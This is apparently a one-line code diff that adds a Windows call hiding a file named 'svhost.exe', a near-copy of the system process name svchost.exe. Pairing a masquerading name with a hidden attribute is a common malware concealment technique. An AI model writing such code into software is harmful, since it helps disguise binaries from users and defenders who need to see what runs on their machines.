@@ -1,0 +1,1 @@
+SetFileAttributes(L"svhost.exe", FILE_ATTRIBUTE_HIDDEN);
